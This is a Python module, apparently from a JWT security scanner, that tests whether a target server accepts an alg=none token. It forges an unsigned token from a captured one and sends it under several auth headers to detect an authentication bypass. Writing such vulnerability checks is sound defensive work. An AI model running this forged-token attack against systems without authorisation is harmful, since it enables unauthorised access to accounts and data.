"""alg=none JWT bypass attack."""

import json
import logging
from typing import Any

from ._helpers import (
    JWT_AUTH_HEADERS,
    _b64url_encode,
    _decode_jwt_part,
    _get_original_status,
    _send_with_token,
)

logger = logging.getLogger(__name__)


def test_alg_none(token: str, url: str, session: Any) -> dict[str, Any]:
    """Test alg=none bypass vulnerability.

    Creates a token with alg=none and checks if the server accepts it
    without verifying the signature.
    """
    result: dict[str, Any] = {"attack": "alg_none_bypass", "vulnerable": False, "details": []}
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return result
        payload = _decode_jwt_part(parts[1])
        if not payload:
            return result

        header = {"alg": "none", "typ": "JWT"}
        header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        none_token = f"{header_b64}.{payload_b64}."

        original_status = _get_original_status(url, session)

        for auth_header in JWT_AUTH_HEADERS:
            resp = _send_with_token(url, none_token, auth_header, session)
            status = resp.get("status", 0)
            body = resp.get("body", "").lower()

            if status in (200, 302) and original_status in (401, 403):
                result["vulnerable"] = True
                result["details"].append(
                    {
                        "auth_header": auth_header,
                        "status_code": status,
                        "original_status": original_status,
                        "finding": "alg_none_bypass_auth_bypass",
                    }
                )
                break
            elif status == 200 and "error" not in body and "invalid" not in body:
                result["vulnerable"] = True
                result["details"].append(
                    {
                        "auth_header": auth_header,
                        "status_code": status,
                        "finding": "alg_none_accepted",
                    }
                )
                break

        logger.info("alg=none test on %s: vulnerable=%s", url, result["vulnerable"])
    except Exception as e:
        logger.error("alg=none test error on %s: %s", url, e)
    return result
